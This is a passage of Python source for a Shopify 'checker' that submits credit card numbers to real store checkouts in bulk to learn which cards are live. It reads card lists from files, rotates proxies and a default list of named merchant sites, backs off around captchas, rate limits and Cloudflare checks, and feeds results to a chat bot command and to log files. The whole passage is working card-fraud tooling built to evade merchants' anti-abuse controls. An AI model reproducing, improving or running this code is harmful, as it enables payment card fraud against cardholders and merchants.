            if is_captcha_required(final_text):
                return True, "CARD_DECLINED", gateway, total_price, currency
            if "WaitingReceipt" in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                code_r   = (res_json.get("data", {}).get("receipt", {})
                            .get("processingError", {}).get("code"))
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif code_r:
                    return True, code_r, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            code_fb = extract_between(final_text, '{"code":"', '"')
            fl      = final_text.lower()
            if "actionreq" in fl or "action_required" in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif "processedreceipt" in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif "failedreceipt" in fl or "declined" in fl:
                return True, code_fb if code_fb else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        err_str = str(e)
        print(f"[ERROR] {type(e).__name__}: {err_str}")
        if any(x in err_str.lower() for x in ["proxy", "cannot connect to host", "proxyerror", "tunnel connection"]):
            return False, f"Cannot connect to proxy: {err_str}", gateway, total_price, currency
        if not any(x in err_str.lower() for x in ["clientresponseerror", "contenten", "brotli", "timeout"]):
            import traceback
            traceback.print_exc()
        return False, f"Error Processing Card: {err_str[:120]}", gateway, total_price, currency


# ---------------------------------------------------------------------------
# Helpers for Flask
# ---------------------------------------------------------------------------
def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {"cc": parts[0].strip(), "mes": parts[1].strip(),
            "ano": parts[2].strip(), "cvv": parts[3].strip()}


async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)


# ---------------------------------------------------------------------------
# Mass mode helpers
# ---------------------------------------------------------------------------
def _parse_cc_line(line: str):
    """
    Parse a line from the mass file. Supported formats:
      CC|MM|YYYY|CVV
      CC|MM|YYYY|CVV|SITE
      CC|MM|YYYY|CVV|SITE|PROXY
    Returns dict or None if the line is invalid/blank/comment.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    parts = [p.strip() for p in line.split("|")]
    if len(parts) < 4:
        return None
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    if not (cc and mes and ano and cvv):
        return None
    if len(ano) == 2:
        ano = "20" + ano
    site  = parts[4] if len(parts) >= 5 and parts[4] else None
    proxy = parts[5] if len(parts) >= 6 and parts[5] else None
    if site:
        site = site.strip().strip('"').strip("'").rstrip("/\\")
        if site and not site.startswith("http"):
            site = "https://" + site
    return {"cc": cc, "mes": mes, "ano": ano, "cvv": cvv,
            "site": site, "proxy": proxy}


async def _mass_run(cards, default_site, default_proxy, delay_s=1.5):
    """
    Sequentially process a list of parsed card dicts.
    Blank site → DEFAULT_SITE_ROTATION. 429 → mark hot + switch site.
    """
    import time as _time

    approved = declined = errors = 0
    results  = []
    total    = len(cards)

    _rot = list(DEFAULT_SITE_ROTATION)
    _rot_i = 0
    _site_cooldown = {}  # host → epoch when usable again

    def _pick_site(preferred=None):
        nonlocal _rot_i
        now = _time.time()
        if preferred:
            return preferred
        if default_site:
            return default_site
        # Prefer current rotation index if not hot
        for n in range(len(_rot)):
            idx = (_rot_i + n) % len(_rot)
            cand = _rot[idx]
            key = _normalize_site_key(cand)
            if now >= _site_cooldown.get(key, 0):
                _rot_i = idx
                return cand
        return _rot[_rot_i % len(_rot)]

    def _advance_rotation():
        nonlocal _rot_i
        _rot_i = (_rot_i + 1) % max(len(_rot), 1)

    def _mark_hot(site, seconds=900):
        key = _normalize_site_key(site or "")
        if not key:
            return
        _site_cooldown[key] = _time.time() + seconds
        print(f"[MASS] site hot → {seconds}s cooldown: {key}")

    # Truncate/create live results file for this mass run
    try:
        with open("results.txt", "w", encoding="utf-8") as f:
            f.write("# Autoshopify mass results (live)\n")
            f.flush()
        print("[MASS] live results → results.txt")
    except Exception as e:
        print(f"[MASS] could not create results.txt: {e}")

    for idx, card in enumerate(cards, 1):
        proxy = card.get("proxy") or default_proxy
        cc, mes, ano, cvv = card["cc"], card["mes"], card["ano"], card["cvv"]
        full_card = f"{cc}|{mes}|{ano}|{cvv}"
        site = _pick_site(card.get("site"))

        # First card: brief settle so CF doesn't treat mass start as a burst
        if idx == 1:
            await asyncio.sleep(1.2)

        print(f"\n[{idx}/{total}] CHECKING: {full_card}  site={site}")
        if proxy:
            print(f"           proxy={proxy}")

        try:
            success, message, gateway, price, currency = await process_card(
                cc, mes, ano, cvv, site, proxy_str=proxy
            )
        except Exception as exc:
            print(f"[{idx}/{total}] ❌ ERROR on {full_card}: {type(exc).__name__}: {exc}")
            errors += 1
            results.append({
                "line": idx, "card": full_card, "site": site,
                "status": "ERROR", "response": f"{type(exc).__name__}: {exc}",
                "gateway": "", "price": "", "currency": "",
            })
            _append_result_live(
                "ERROR", full_card, f"{type(exc).__name__}: {exc}",
                "", "", "", site,
            )
            await asyncio.sleep(delay_s)
            continue

        clean = extract_clean_response(message)
        if success and clean == "ORDER_PLACED":
            approved += 1
            status = "APPROVED"
        elif success:
            status = "CHARGED" if clean not in ("CARD_DECLINED",) else "DECLINED"
            if status == "DECLINED":
                declined += 1
            else:
                approved += 1
        else:
            declined += 1
            status = "DECLINED"

        print(f"[{idx}/{total}] → {status} | CARD={full_card} | {clean} | {gateway} | {currency} {price}")
        results.append({
            "line": idx, "card": full_card, "site": site, "status": status,
            "response": clean, "gateway": gateway,
            "price": price, "currency": currency,
        })
        # Live save — do not wait for batch end
        _append_result_live(status, full_card, clean, gateway, price, currency, site)

        if idx < total:
            _extra = 0.0
            _cl = (clean or "").lower()
            # Only switch sites on rate-limit — stay on same site otherwise
            _rate = any(x in _cl for x in (
                "429", "rate limit", "throttled", "too many",
                "verifying your connection", "change proxy or site",
            ))
            if _rate:
                _mark_hot(site, seconds=900)
                _advance_rotation()
                _next = _pick_site(None)
                print(f"[MASS] 429/rate-limit → switch next site: {_next}")
                _extra = 20.0 + random.random() * 10.0
                print(f"[MASS] extra cooldown {_extra:.0f}s before next card")
            await asyncio.sleep(delay_s + _extra)

    return approved, declined, errors, results


def _append_result_live(status, full_card, clean, gateway, price, currency, site):
    """Write one mass-check result to results.txt immediately (flush each line)."""
    try:
        import datetime as _dt
        stamp = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = (
            f"[{stamp}] {status:9s} | {full_card} | {clean} | "
            f"{gateway} | {currency} {price} | {site}\n"
        )
        with open("results.txt", "a", encoding="utf-8") as f:
            f.write(line)
            f.flush()
    except Exception as e:
        print(f"[MASS] results.txt write failed: {e}")


def _write_mass_log(results):
    """Append mass results to logs/mass_results.txt."""
    try:
        import os as _os, datetime as _dt
        _os.makedirs("logs", exist_ok=True)
        stamp = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("logs/mass_results.txt", "a", encoding="utf-8") as f:
            for r in results:
                f.write(
                    f"[{stamp}] #{r['line']:03d} {r['status']:9s} "
                    f"card={r['card']} site={r['site']} "
                    f"gw={r['gateway']} price={r['currency']} {r['price']} "
                    f"resp={r['response']}\n"
                )
        print(f"[MASS] results appended to logs/mass_results.txt")
    except Exception as e:
        print(f"[MASS] failed to write results log: {e}")



# ---------------------------------------------------------------------------
# check_card_native — wrapper for bot integration
# Called by bot.py /sh handler
# Returns dict with: Response, Message, Product, Price, Site, Charged, Gateway
# ---------------------------------------------------------------------------
async def check_card_native(cc, mm, yy, cvv, site_url=None, proxy_str=None, extra_sites=None, mass_mode=False):
    """
    Bot-compatible wrapper around process_card.
    Returns a dict the bot's /sh handler expects.

    PROPERLY DISTINGUISHES:
    - Checkout/validation errors (SubmitRejected) → UNTESTED, bank never reached
    - Bank responses (poll FailedReceipt/ProcessedReceipt) → real bank code
    - Approved/charged (ProcessedReceipt) → ORDER_PLACED, Charged=True

    SITE ROTATION:
    - If the primary site fails with CART_FAILED/429/cooldown, rotate
      to the next site in DEFAULT_SITE_ROTATION
    - Tries up to 3 sites before giving up
    """
    import time as _time_mod
    _sh_start = _time_mod.time()

    # Build site list: user-specified site first, then user's /addsite sites
    # If user has sites via /addsite, use ONLY those — no defaults mixed in
    _extra = []
    if extra_sites:
        for s in extra_sites:
            s_clean = s.strip().replace("https://", "").replace("http://", "").rstrip("/")
            if s_clean and "." in s_clean:
                _extra.append("https://" + s_clean)
    if site_url:
        # User specified a site directly — use it + user sites + defaults as fallback
        sites_to_try = [site_url] + _extra + [s for s in DEFAULT_SITE_ROTATION if s != site_url and s not in _extra]
    elif _extra:
        # User has /addsite sites — use ONLY those, no defaults
        sites_to_try = _extra
    else:
        # No user sites — use defaults
        sites_to_try = list(DEFAULT_SITE_ROTATION)

    success, message, gateway, price, currency = False, "No site available", "Shopify", "N/A", "USD"

    for _site in sites_to_try[:8]:
        try:
            # Limit concurrent workers per site — prevents hammering
            _site_key = _normalize_site_key(_site)
            _sem = _get_site_sem(_site_key)
            async with _sem:
                success, message, gateway, price, currency = await process_card(
                    cc, mm, yy, cvv, _site,
                    proxy_str=proxy_str
                )
        except Exception as e:
            success, message = False, str(e)[:120]
            gateway = "Shopify"
            price = "N/A"
            currency = "USD"

        # If bank responded (success=True), stop rotating
        _clean = extract_clean_response(message) if message else "UNKNOWN"
        _msg = str(message or "")
        if success:
            break  # Bank responded — stop rotating

        # ALL checkout/site errors → rotate to next site
        ROTATE_ERRORS = (
            "CART_FAILED", "Cart failed with status 429", "UNKNOWN",
            "NO_PRODUCTS", "Not Shopify", "Site requires login!",
            "SITE_ERROR", "No Products", "UNTESTED",
            "Payment method not available", "Failed to get session token",
            "Checkpoint Denied", "Negotiation failed", "No seller proposal",
            "No valid payment method found", "No runningTotal", "Throttled",
            "CAPTCHA_REQUIRED", "CAPTCHA_REQUIRED on submit",
            "Change Proxy", "Change Proxy or Site",
            "VALIDATION_CUSTOM", "VALIDATION_ERROR",
        )
        # Also rotate on any "Site Error" or "Cart failed" message
        should_rotate = (
            _clean in ROTATE_ERRORS
            or _msg.startswith("Site Error")
            or _msg.startswith("Cart failed")
            or _msg.startswith("Cannot connect")
            or _msg.startswith("No Products")
            or _msg.startswith("Not Shopify")
            or _msg.startswith("Site requires")
            or _msg.startswith("Payment method")
            or _msg.startswith("Failed to get")
            or _msg.startswith("Checkout page error")
            or _msg.startswith("Unable to get payment")
            or "429" in _msg
            or "CAPTCHA" in _msg.upper()
        )
        if should_rotate:
            print(f"[SH-ROTATE] {_site} failed ({_clean}) — trying next site")
            await asyncio.sleep(0.5)
            continue
        # Unknown error that might be a real response → stop rotating
        break

    import time as _time_mod
    _elapsed = _time_mod.time() - _sh_start
    clean = extract_clean_response(message) if message else "UNKNOWN"

    # ── CHECKOUT ERRORS — bank never reached ──────────────────────────────
    # These are Shopify validation/gateway errors, NOT bank responses.
    # The card was never sent to the issuing bank.
    CHECKOUT_ERRORS = {
        "VALIDATION_CUSTOM", "VALIDATION_ERROR",
        "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
        "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
        "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
        "TAX_NEW_TAX_MUST_BE_ACCEPTED",
        "WAITING_PENDING_TERMS",
        "PAYMENTS_FIRST_NAME_REQUIRED",
        "PAYMENTS_LAST_NAME_REQUIRED",
        "REQUIRED_ARTIFACTS",
        "INVENTORY_RESERVATION_FAILURE",
        "InventoryReservationFailure",
        "CART_FAILED",
        "NO_PRODUCTS",
        "Not Shopify",
        "Site requires login!",
        "Payment method not available",
        "Failed to get session token",
        "Checkpoint Denied",
        "Negotiation failed",
        "No seller proposal",
        "No valid payment method found",
        "No runningTotal",
        "Throttled",
        "CAPTCHA_REQUIRED",
        "CAPTCHA_REQUIRED on submit",
        "Change Proxy",
        "Change Proxy or Site",
    }

    # If the response is a checkout error, return UNTESTED — bank never spoke
    if clean in CHECKOUT_ERRORS or not success:
        # Check if it's a real bank response despite success=False
        # process_card returns success=True for FailedReceipt (bank responded)
        # and success=False for checkout errors
        # So if success=False, it's ALWAYS a checkout error, not a bank response
        return {
            "Response": "UNTESTED",
            "Message": str(message)[:160] if message else clean,
            "Product": "",
            "Price": str(price) if price else "N/A",
            "Site": site_url or "",
            "Charged": "False",
            "Gateway": gateway or "Shopify",
            "Time": f"{round(_elapsed, 1)}s",
        }

    # ── BANK RESPONSES — bank spoke ───────────────────────────────────────
    # success=True means the card reached the bank (SubmitSuccess + poll)
    # clean contains the actual bank response code

    # ORDER_PLACED = bank approved, money charged
    charged = "True" if clean == "ORDER_PLACED" else "False"

    # OTP_REQUIRED = bank requires 3DS verification (card is live)
    # All other codes = bank decline codes (CARD_DECLINED, INSUFFICIENT_FUNDS, etc.)

    return {
        "Response": clean,
        "Message": str(message)[:160] if message else clean,
        "Product": "",
        "Price": str(price) if price else "N/A",
        "Site": site_url or "",
        "Charged": charged,
        "Gateway": gateway or "Shopify",
        "Time": f"{round(_elapsed, 1)}s",
    }


# ---------------------------------------------------------------------------
# Standalone entry point — single card or mass file
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import sys

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    print("=" * 60)
    print("  Autoshopify — Checker")
    print("=" * 60)

    print("\nSelect mode:")
    print("  [1] Single — check one card on one site")
    print("  [2] Mass   — check many cards from a .txt file")
    while True:
        mode = input("Mode (1/2): ").strip()
        if mode in ("1", "2"):
            break
        print("[!] Enter 1 or 2.")

    # =========================================================================
    # SINGLE MODE
    # =========================================================================
    if mode == "1":
        while True:
            site = input("\nShopify link (blank = Gurney's / rotation default): ").strip()
            if not site:
                site = DEFAULT_SITE_ROTATION[0]
                print(f"[!] Using default: {site}")
                break
            if not site.startswith("http"):
                site = "https://" + site
            break

        while True:
            raw = input("Card (CCN|MM|YY|CVV  or  CCN|MM|YYYY|CVV): ").strip()
            parts = [p.strip() for p in raw.split("|")]
            if len(parts) == 4 and all(parts):
                cc, mes, ano, cvv = parts
                if len(ano) == 2:
                    ano = "20" + ano
                break
            print("[!] Invalid format. Example: 4111111111111111|01|2027|123")

        proxy_input = input("Proxy (leave blank for none): ").strip()
        proxy_str   = proxy_input if proxy_input else None

        print("\n" + "=" * 60)
        print(f"  Site : {site}")
        print(f"  Card : {cc}|{mes}|{ano}|{cvv}")
        if proxy_str:
            print(f"  Proxy: {proxy_str}")
        print("=" * 60 + "\n")

        try:
            success, message, gateway, price, currency = asyncio.run(
                process_card(cc, mes, ano, cvv, site, proxy_str=proxy_str)
            )
        except KeyboardInterrupt:
            print("\n[!] Aborted by user.")
            sys.exit(0)
        except Exception as exc:
            print(f"\n[ERROR] Unexpected exception: {exc}")
            import traceback; traceback.print_exc()
            sys.exit(1)

        clean = extract_clean_response(message)
        print("\n" + "=" * 60)
        print("  RESULT")
        print("=" * 60)
        status_label = "✅ APPROVED" if (success and clean == "ORDER_PLACED") else "❌ DECLINED"
        print(f"  Status  : {status_label}")
        print(f"  Card    : {cc}|{mes}|{ano}|{cvv}")
        print(f"  Gateway : {gateway}")
        print(f"  Price   : {currency} {price}")
        print(f"  Response: {clean}")
        print("=" * 60)
        sys.exit(0)

    # =========================================================================
    # MASS MODE
    # =========================================================================
    print("\nMass mode — file format (one per line):")
    print("  CC|MM|YYYY|CVV")
    print("  CC|MM|YYYY|CVV|SITE")
    print("  CC|MM|YYYY|CVV|SITE|PROXY")
    print("  Lines starting with # are ignored.\n")

    while True:
        path = input("Path to card list (.txt): ").strip().strip('"').strip("'")
        if not path:
            print("[!] Path cannot be empty.")
            continue
        try:
            with open(path, "r", encoding="utf-8") as f:
                raw_lines = f.readlines()
            break
        except FileNotFoundError:
            print(f"[!] File not found: {path}")
        except Exception as e:
            print(f"[!] Cannot read file: {e}")

    cards = []
    skipped = 0
    for ln in raw_lines:
        parsed = _parse_cc_line(ln)
        if parsed is None:
            if ln.strip() and not ln.strip().startswith("#"):
                skipped += 1
            continue
        cards.append(parsed)

    if not cards:
        print("[!] No valid card lines found in file. Aborting.")
        sys.exit(1)

    needs_default_site = any(c["site"] is None for c in cards)
    default_site = None
    if needs_default_site:
        while True:
            default_site = input(
                "\nSome lines have no SITE column.\n"
                "Default Shopify link for those lines (leave blank to skip them): "
            ).strip()
            if not default_site:
                # Blank = use built-in rotation (Gurney's → True Leaf → Botanical)
                print("[MASS] No default site — using rotation:")
                for i, s in enumerate(DEFAULT_SITE_ROTATION, 1):
                    print(f"         {i}. {s}")
                default_site = None  # _mass_run will rotate
                break
            if not default_site.startswith("http"):
                default_site = "https://" + default_site
            break

    default_proxy = None
    if any(c["proxy"] is None for c in cards):
        pi = input(
            "Default proxy for lines without one (blank = direct): "
        ).strip()
        default_proxy = pi if pi else None

    di = input("Delay between cards in seconds (blank = 6): ").strip()
    try:
        delay_s = float(di) if di else 6.0
        if delay_s < 0:
            delay_s = 6.0
    except ValueError:
        delay_s = 6.0

    print("\n" + "=" * 60)
    print(f"  Mode        : MASS")
    print(f"  File        : {path}")
    print(f"  Valid cards : {len(cards)}")
    print(f"  Skipped     : {skipped}")
    if default_site:
        print(f"  Default site: {default_site}")
    if default_proxy:
        print(f"  Default prx : {default_proxy}")
    print(f"  Delay       : {delay_s}s")
    print("=" * 60)
    confirm = input("\nStart? (y/n): ").strip().lower()
    if confirm != "y":
        print("[!] Aborted.")
        sys.exit(0)

    try:
        approved, declined, errors, results = asyncio.run(
            _mass_run(cards, default_site, default_proxy, delay_s)
        )
    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        sys.exit(0)
    except Exception as exc:
        print(f"\n[ERROR] Unexpected exception: {exc}")
        import traceback; traceback.print_exc()
        sys.exit(1)

    print("\n" + "=" * 60)
    print("  MASS SUMMARY")
    print("=" * 60)
    print(f"  Total      : {len(cards)}")
    print(f"  ✅ Approved : {approved}")
    print(f"  ❌ Declined : {declined}")
    print(f"  ⚠️  Errors   : {errors}")
    print("=" * 60)

    _write_mass_log(results)